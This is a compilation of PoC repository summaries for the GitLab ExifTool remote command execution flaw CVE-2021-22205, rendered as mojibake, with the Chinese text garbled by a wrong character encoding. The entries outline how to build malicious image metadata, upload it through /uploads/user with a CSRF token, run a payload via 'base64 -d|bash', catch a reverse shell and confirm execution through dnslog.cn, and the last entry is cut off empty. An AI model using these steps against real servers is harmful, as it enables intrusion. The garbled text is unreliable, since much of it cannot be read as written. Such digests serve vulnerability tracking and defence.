3.  **è§¦å‘æ¼æ´žï¼š** GitLabåŽç«¯ä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾ç‰‡æ—¶ï¼Œä¼šè§£æžå›¾ç‰‡å…ƒæ•°æ®ï¼Œä»Žè€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚
4.  **èŽ·å–Shellï¼š** æ”»å‡»è€…åœ¨æœ¬åœ°ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…ç›®æ ‡æœºå™¨åå¼¹shellè¿žæŽ¥ï¼Œä»Žè€ŒèŽ·å–å¯¹æœåŠ¡å™¨çš„æŽ§åˆ¶æƒã€‚

**æœ‰æ•ˆæ€§ï¼š** æ ¹æ®æä¾›çš„POCä»£ç å’Œæ¼æ´žæè¿°ï¼Œè¯¥POCåº”è¯¥æ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥ç”¨äºŽåœ¨å—å½±å“çš„GitLabç‰ˆæœ¬ä¸Šå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©ï¼š** åˆ†æžæä¾›çš„POCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡æ–‡ä»¶ï¼Œä»¥åŠä¸€äº›è¾…åŠ©è„šæœ¬ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [shang159/CVE-2021-22205-getshell](https://github.com/shang159/CVE-2021-22205-getshell)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #24

**æ¥æº**: [CVE-2021-22205-w0x68y_Gitlab-CVE-2021-22205.md](../2021/CVE-2021-22205-w0x68y_Gitlab-CVE-2021-22205.md)

## CVE-2021-22205 - GitLab ExifTool è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE ç‰ˆæœ¬ä¸­ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚è¯¥æ¼æ´žçš„æ ¹æœ¬åŽŸå› æ˜¯ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™ ExifTool æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„ Python è„šæœ¬ `CVE-2021-22205-check.py` æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ PoC è„šæœ¬ï¼Œç”¨äºŽæ£€æµ‹å’Œåˆ©ç”¨è¯¥æ¼æ´žã€‚å®ƒé€šè¿‡ä¸Šä¼ ä¸€ä¸ªåŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶æ¥å®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚è¯¥è„šæœ¬ä¼šå°è¯•èŽ·å– CSRF tokenï¼Œç„¶åŽä¸Šä¼ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾åƒã€‚

**æŠ•æ¯’é£Žé™©ï¼š** ç»è¿‡åˆ†æžï¼Œæä¾›çš„ä»£ç ä»“åº“ä¸­æœªå‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è„šæœ¬çš„åŠŸèƒ½æ˜Žç¡®ï¼Œä¸”æ²¡æœ‰å‘çŽ°éšè—çš„æ¶æ„è¡Œä¸ºã€‚PoCè„šæœ¬ä¸­æ‰§è¡Œçš„å‘½ä»¤ï¼Œç”±ä½¿ç”¨è€…`-c`å‚æ•°æŒ‡å®šï¼Œå±žäºŽæ­£å¸¸çš„åŠŸèƒ½éªŒè¯ï¼Œè€ŒéžæŠ•æ¯’ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´žè§¦å‘ï¼š** æ”»å‡»è€…éœ€è¦å‘å­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ä¸Šä¼ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
2.  **å‘½ä»¤æ³¨å…¥ï¼š** æ¶æ„å…ƒæ•°æ®è¢« ExifTool å¤„ç†æ—¶ï¼Œä¼šå¯¼è‡´å‘½ä»¤æ³¨å…¥ï¼Œä»Žè€Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
3.  **æœªæŽˆæƒè®¿é—®ï¼š** æ­¤æ¼æ´žæ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨ï¼Œå¤§å¤§é™ä½Žäº†æ”»å‡»é—¨æ§›ã€‚
4.  **RCEï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´žåŽï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ GitLab æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»Žè€ŒæŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [w0x68y/Gitlab-CVE-2021-22205](https://github.com/w0x68y/Gitlab-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---



---

## POC #11

**æ¥æº**: [CVE-2021-22205-findneo_GitLab-preauth-RCE_CVE-2021-22205.md](../2021/CVE-2021-22205-findneo_GitLab-preauth-RCE_CVE-2021-22205.md)

## CVE-2021-22205 - GitLab ExifTool å‘½ä»¤æ³¨å…¥

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** å‘½ä»¤æ³¨å…¥

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8 || >=13.9, <13.9.6 || >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹éœ€è¦å­˜åœ¨æ¼æ´žç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯ä¸€ä¸ªGitLab CE/EEä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œå­˜åœ¨äºŽ11.9åˆ°13.10.3ä¹‹é—´çš„å¤šä¸ªç‰ˆæœ¬ä¸­ã€‚æ¼æ´žåŽŸå› æ˜¯GitLabåœ¨å¤„ç†å›¾åƒæ–‡ä»¶æ—¶ï¼Œæœªæ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„è¾“å…¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„å›¾åƒæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«åµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚POCä»£ç ä¸­ï¼Œä½¿ç”¨äº†`xxd`å‘½ä»¤å°†åå…­è¿›åˆ¶æ•°æ®è½¬æ¢æˆäºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶è¿½åŠ åˆ°åä¸º`1.jpg`çš„æ–‡ä»¶ä¸­ã€‚å…¶ä¸­ï¼Œè¿½åŠ çš„åå…­è¿›åˆ¶æ•°æ®ä¸­åŒ…å«äº†shellå‘½ä»¤ï¼Œæœ€ç»ˆå°†`xxx_base64_of_reverse_shell_code_xxx`è¿›è¡Œbase64è§£ç åŽæ‰§è¡Œã€‚
2.  æ”»å‡»è€…é€šè¿‡`curl`å‘½ä»¤ï¼Œæ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ã€‚POCä»£ç é€šè¿‡èŽ·å–ç”¨æˆ·çš„CSRF-Tokenï¼Œç„¶åŽåˆ©ç”¨/uploads/useræŽ¥å£ä¸Šä¼ ã€‚
3.  GitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼Œç”±äºŽå›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´ExifToolæ‰§è¡Œè¯¥å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚
4.  POCä¸­ä½¿ç”¨äº†`base64 -d|bash` çš„æ–¹å¼æ‰§è¡Œpayloadã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**

æä¾›çš„POCä»£ç ç›®çš„æ˜¯åˆ©ç”¨è¯¥æ¼æ´žå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œè™½ç„¶æ‰§è¡Œäº†å¤–éƒ¨å‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰å‘çŽ°ä½œè€…åœ¨å…¶ä¸­éšè—å…¶ä»–æ¶æ„ä»£ç çš„è¡Œä¸ºã€‚ä»£ç æ¸…æ™°åœ°å±•ç¤ºäº†æ¼æ´žåˆ©ç”¨çš„è¿‡ç¨‹ï¼Œæ²¡æœ‰å‘çŽ°è¯•å›¾åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå®‰è£…åŽé—¨æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ“ä½œçš„è¿¹è±¡ã€‚è¯¥POCçš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºæ¼æ´žåˆ©ç”¨ï¼Œè€Œéžè¿›è¡Œå®žé™…çš„æ¶æ„æ”»å‡»ã€‚

å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [findneo/GitLab-preauth-RCE_CVE-2021-22205](https://github.com/findneo/GitLab-preauth-RCE_CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #12

**æ¥æº**: [CVE-2021-22205-hh-hunter_cve-2021-22205.md](../2021/CVE-2021-22205-hh-hunter_cve-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®GitLabå®žä¾‹ï¼Œç›®æ ‡å®žä¾‹ä½¿ç”¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä¸Šä¼ å›¾ç‰‡ï¼ˆæˆ–å…¶ä»–åˆ©ç”¨ExifToolè§£æžçš„æ–‡ä»¶ç±»åž‹ï¼‰ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽGitLabå¯¹ä¸Šä¼ çš„å›¾ç‰‡æ–‡ä»¶ï¼ˆæˆ–å…¶ä»–åˆ©ç”¨ExifToolè§£æžçš„æ–‡ä»¶ç±»åž‹ï¼‰çš„æ ¡éªŒä¸ä¸¥æ ¼ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æž„é€ æ¶æ„çš„å›¾ç‰‡æ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„docker-composeæ–‡ä»¶ä¸»è¦ç”¨äºŽæ­å»ºå­˜åœ¨æ¼æ´žå’Œä¸å­˜åœ¨æ¼æ´žçš„çŽ¯å¢ƒï¼Œç”¨äºŽéªŒè¯æ¼æ´žçš„ä¿®å¤æ•ˆæžœã€‚docker-compose-vulnerability.yml ä½¿ç”¨äº†13.9.5-ee.0ç‰ˆæœ¬ï¼Œåœ¨å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¯ä»¥éªŒè¯æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„docker-composeæ–‡ä»¶ä»…ä»…ç”¨äºŽæž„å»ºçŽ¯å¢ƒï¼Œæ²¡æœ‰å‘çŽ°æ¶æ„ä»£ç ï¼ŒæŠ•æ¯’é£Žé™©ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
æ”»å‡»è€…é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾ç‰‡æ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒåŒ…å«æ¶æ„å‘½ä»¤çš„Exifå…ƒæ•°æ®çš„å›¾ç‰‡æ–‡ä»¶ï¼‰åˆ°GitLabæœåŠ¡å™¨ã€‚GitLabä½¿ç”¨ExifToolè§£æžè¯¥å›¾ç‰‡æ–‡ä»¶æ—¶ï¼Œä¼šæ‰§è¡Œå›¾ç‰‡ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š

1.  æž„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡æ–‡ä»¶ã€‚
2.  å°†è¯¥å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ åˆ°GitLabæœåŠ¡å™¨ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥é€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®logoä¸Šä¼ ç­‰åŠŸèƒ½ã€‚
3.  GitLabæœåŠ¡å™¨è°ƒç”¨ExifToolè§£æžè¯¥å›¾ç‰‡æ–‡ä»¶ï¼Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚
4.  æ”»å‡»è€…é€šè¿‡æ‰§è¡Œçš„å‘½ä»¤æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [hh-hunter/cve-2021-22205](https://github.com/hh-hunter/cve-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #13

**æ¥æº**: [CVE-2021-22205-hhhotdrink_CVE-2021-22205.md](../2021/CVE-2021-22205-hhhotdrink_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹éœ€è¦ä½äºŽå—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆåˆ©ç”¨ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼‰æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žæ˜¯æœ‰æ•ˆçš„ï¼Œå¹¶ä¸”å·²è¢«å…¬å¼€åˆ©ç”¨ã€‚CISA å·²å°†å…¶æ·»åŠ åˆ°å·²çŸ¥è¢«åˆ©ç”¨çš„æ¼æ´žç›®å½•ä¸­ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„ Python è„šæœ¬ `22205exp.py` åŒ…å«æ¼æ´žéªŒè¯å’Œåˆ©ç”¨ä»£ç ã€‚ è¯¥è„šæœ¬åˆ©ç”¨ `dnslog.cn` æ¥éªŒè¯å‘½ä»¤æ‰§è¡Œã€‚ è™½ç„¶ `dnslog.cn` æ˜¯ä¸€ç§å¸¸è§çš„æ¼æ´žéªŒè¯æ–¹æ³•ï¼Œä½†å¦‚æžœæ”»å‡»è€…æŽ§åˆ¶ `dnslog.cn`ï¼Œåˆ™å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ï¼Œä»–ä»¬å¯ä»¥è®°å½•æ¼æ´žåˆ©ç”¨ä¿¡æ¯ã€‚ åŒæ—¶ï¼Œè„šæœ¬ä¸­ä½¿ç”¨äº†ç¡¬ç¼–ç çš„User-Agentå’ŒContent-Typeï¼Œè¿™å¢žåŠ äº†è„šæœ¬è¢«è¯†åˆ«å’Œé˜²å¾¡çš„å¯èƒ½æ€§ã€‚å¦‚æžœæ”»å‡»è€…ä¿®æ”¹è¿™äº›å‚æ•°ï¼Œå¯èƒ½ä¼šå¢žåŠ æ”»å‡»çš„æˆåŠŸçŽ‡ï¼Œä½†ä¹Ÿå¯èƒ½è¢«è§†ä¸ºæ½œåœ¨çš„æ¶æ„è¡Œä¸ºã€‚ æ­¤å¤–ï¼Œè¯¥è„šæœ¬ä¾èµ–äºŽ `beautifulsoup4` å’Œ `requests` åº“ã€‚ å¦‚æžœè¿™äº›åº“è¢«æ¶æ„ç¯¡æ”¹ï¼Œå¯èƒ½ä¼šå¯¼è‡´æŠ•æ¯’ã€‚ ç»¼åˆæ¥çœ‹ï¼Œè„šæœ¬æœ¬èº«åŒ…å«ç›´æŽ¥çš„åŽé—¨ä»£ç çš„å¯èƒ½æ€§è¾ƒä½Žï¼Œä½†é—´æŽ¥æŠ•æ¯’é£Žé™©ï¼ˆå¦‚ä¾èµ–åº“æˆ–éªŒè¯å¹³å°è¢«æŽ§åˆ¶ï¼‰ä»ç„¶å­˜åœ¨ï¼Œå› æ­¤æŠ•æ¯’é£Žé™©å¤§çº¦ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **èŽ·å– CSRF Tokenï¼š** è„šæœ¬é¦–å…ˆè®¿é—® `/users/sign_in` é¡µé¢ï¼Œä½¿ç”¨ `BeautifulSoup` è§£æž HTMLï¼Œæå– CSRF tokenã€‚
2.  **æž„é€ æ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å‘½ä»¤çš„ DJVU æ ¼å¼å›¾åƒæ–‡ä»¶ã€‚è¯¥å‘½ä»¤é€šå¸¸ç”¨äºŽæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œä¾‹å¦‚é€šè¿‡ `curl` å°†æœåŠ¡å™¨ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„ DNS æœåŠ¡å™¨ã€‚
3.  **ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬ä½¿ç”¨åŒ…å«æ¶æ„å›¾åƒæ–‡ä»¶å’Œ CSRF token çš„ `multipart/form-data` è¯·æ±‚ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` ç«¯ç‚¹ã€‚
4.  **è§¦å‘å‘½ä»¤æ‰§è¡Œï¼š** GitLab å°è¯•ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒï¼Œç”±äºŽæ–‡ä»¶å†…å®¹æ²¡æœ‰ç»è¿‡å……åˆ†éªŒè¯ï¼Œå¯¼è‡´ ExifTool æ‰§è¡ŒåµŒå…¥åœ¨å›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ã€‚
5.  **éªŒè¯æ¼æ´žï¼š** è„šæœ¬é€šè¿‡æŸ¥è¯¢ `dnslog.cn` æ¥ç¡®è®¤å‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚

æ€»çš„æ¥è¯´ï¼Œè¯¥æ¼æ´žåˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œä½†éœ€è¦æ³¨æ„æ½œåœ¨çš„æŠ•æ¯’é£Žé™©ã€‚åˆ©ç”¨æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥å®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [hhhotdrink/CVE-2021-22205](https://github.com/hhhotdrink/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #14

**æ¥æº**: [CVE-2021-22205-honypot_CVE-2021-22205.md](../2021/CVE-2021-22205-honypot_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æŽ§åˆ¶å—å½±å“çš„GitLabå®žä¾‹

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æœªç»èº«ä»½éªŒè¯çš„ç½‘ç»œè®¿é—®ï¼Œä»¥åŠç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 20%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚ç”±äºŽGitLabæ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´äº†å‘½ä»¤æ³¨å…¥ã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolçš„æ¼æ´žæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨Docker Composeéƒ¨ç½²äº†ä¸€ä¸ªåŒ…å«æ¼æ´žçš„GitLab EE 13.9.5å®žä¾‹ï¼Œè¡¨æ˜Žè¯¥POCæ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥å¤çŽ°è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
å°½ç®¡å¤§éƒ¨åˆ†ä»£ç çœ‹èµ·æ¥æ˜¯ä¸ºäº†å¤çŽ°æ¼æ´žï¼Œä½†ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£Žé™©ã€‚
*   `gitlab/entry.sh`è„šæœ¬æ·»åŠ äº†ä¸€ä¸ªåä¸º`eth1`çš„è™šæ‹Ÿç½‘ç»œæŽ¥å£ï¼Œå¹¶åˆ†é…äº†ä¸€ä¸ªå…¬ç½‘IPåœ°å€ã€‚è¿™æœ¬èº«å¹¶æ²¡æœ‰æ¶æ„ï¼Œä½†å¦‚æžœæ”»å‡»è€…æŽ§åˆ¶äº†GitLabå®žä¾‹ï¼Œåˆ™å¯èƒ½åˆ©ç”¨æ­¤æŽ¥å£è¿›è¡Œéšè”½é€šä¿¡æˆ–æ•°æ®æ³„éœ²ã€‚å¯èƒ½æ€§ä¸º10%ã€‚
* `gitlab/dummy/backup.txt`åŒ…å«äº†ä¸€ä¸ªé»˜è®¤çš„ç”¨æˆ·åå¯†ç ,å¦‚æžœè¢«åˆ©ç”¨,å­˜åœ¨å®‰å…¨é£Žé™©ã€‚å¯èƒ½æ€§ä¸º10%.

æ€»ä½“çš„æŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º20%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…éœ€è¦æž„å»ºä¸€ä¸ªæ¶æ„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«åµŒå…¥çš„ExifToolå‘½ä»¤æ³¨å…¥Payloadã€‚
2.  æ”»å‡»è€…å°†æ¶æ„å›¾åƒä¸Šä¼ åˆ°æ˜“å—æ”»å‡»çš„GitLabå®žä¾‹ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®é™„ä»¶ç­‰ï¼‰ã€‚
3.  GitLabå°è¯•å¤„ç†å›¾åƒï¼Œè°ƒç”¨ExifToolã€‚
4.  ExifToolæ‰§è¡Œæ³¨å…¥çš„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [honypot/CVE-2021-22205](https://github.com/honypot/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #15

**æ¥æº**: [CVE-2021-22205-inspiringz_CVE-2021-22205.md](../2021/CVE-2021-22205-inspiringz_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼ŒæœªæŽˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žï¼Œå¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

